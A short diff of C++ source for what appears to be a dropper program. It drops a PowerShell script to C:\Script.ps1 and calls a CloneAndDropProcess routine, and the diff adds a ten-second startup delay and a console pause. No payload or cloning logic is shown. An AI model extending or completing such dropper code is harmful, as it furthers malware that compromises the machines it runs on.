@@ -362,6 +362,7 @@ bool CloneAndDropProcess() {
 
 int main() {
 	// drop powershell script
+	Sleep(10000);
 	{
 		// Path for the output file
 		std::string filePath = "C:\\Script.ps1"; // Change the file name and extension as needed
@@ -420,7 +421,7 @@ int main() {
         CloneAndDropProcess();
     }
 
-	//std::cin.get();
+	std::cin.get();
     //Sleep(4000);
     return 0;
 }
